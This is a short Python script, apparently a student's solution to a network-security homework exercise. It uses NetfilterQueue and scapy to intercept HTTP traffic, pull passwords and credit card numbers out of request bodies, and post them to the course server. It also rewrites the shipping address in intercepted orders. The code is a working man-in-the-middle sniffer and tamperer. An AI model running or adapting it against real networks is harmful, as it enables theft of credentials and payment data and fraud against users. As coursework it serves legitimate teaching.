from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import requests
# To drop the packet: ​ pkg.drop()​
#     For this exercise, you can safely drop all packets.

def callback(pkt):
    raw = pkt.get_payload()
    ip = IP(raw)
    if(ip.haslayer(TCP)):
        tcp = ip[TCP]
        if(tcp.dport == 80):
            if(tcp.haslayer(Raw)):
                http = ip[Raw].load.decode()
                http_lines = http.splitlines()
                data = http_lines[-1]
                find_shipping(data)
                find_secret(data)
                if len(secrets) >= 5:
                    send_secrets(secrets)
    pkt.accept()

def find_secret(text):
    def find_pwd(text):
        secret = 0
        pwd = text.rpartition(' pwd ---')[2].split()[0]
        if pwd.isupper():
            secret = pwd
        return secret
    def find_cc(text):
        secret = 0
        cc = text.rpartition(' cc ---')[2].split()[0]
        if '.' in cc:
            secret = find_cc_sep(cc,'.')
        elif '/' in cc:
            secret = find_cc_sep(cc,'/')
        return secret
    def find_cc_sep(cc, sep):
        secret = 0
        cc_array = cc.split(sep)
        flag = True
        if (len(cc_array) != 4):
            flag = False
        for cc_nb in cc_array:
            if(len(cc_nb) != 4):
                flag = False
        if flag:
            secret = cc
        return secret

    secret = 0
    if ' pwd ---' in text:
        secret = find_pwd(text)
    elif ' cc --- ' in text:
        secret = find_cc(text)

    if secret:
        if secret not in secrets:
            secrets.append(secret)

def send_secrets(secrets):
    server='http://com402.epfl.ch/hw1/ex4/sensitive'
    email = 'lucia.monterosanchis@epfl.ch'
    json_data = {"student_email": email, "secrets": secrets}
    r = requests.post(server, json=json_data)
    print('ex4: {}'.format(r.text))

def find_shipping(data):
    if '{' in data:
        server='http://com402.epfl.ch/hw1/ex3/shipping'
        json_data = json.loads(data)
        json_data["shipping_address"] = 'lucia.monterosanchis@epfl.ch'
        r = requests.post(server, json=json_data)
        print('ex3: {}'.format(r.text))

secrets = []
nfqueue = NetfilterQueue()
# To not overload the queue, specifying queue length
nfqueue.bind(0, callback, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')
nfqueue.unbind()

